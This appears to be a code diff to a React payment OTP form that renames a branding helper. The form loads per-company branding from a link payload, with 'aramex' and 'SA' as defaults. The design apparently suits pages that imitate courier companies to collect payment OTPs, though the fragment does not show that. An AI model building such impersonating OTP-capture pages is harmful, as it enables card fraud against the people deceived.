@@ -3,7 +3,7 @@ import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Badge } from "@/components/ui/badge";
-import { getServiceBranding } from "@/lib/serviceLogos";
+import { getCompanyBranding } from "@/lib/companyBranding";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { Shield, AlertCircle, ArrowLeft, Lock as LockIcon, CheckCircle } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
@@ -29,7 +29,7 @@ const PaymentOTPForm = () => {
   const customerInfo = linkData?.payload?.customerInfo || {};
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+  const branding = getCompanyBranding(serviceKey);
 
   // Get country from link data
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
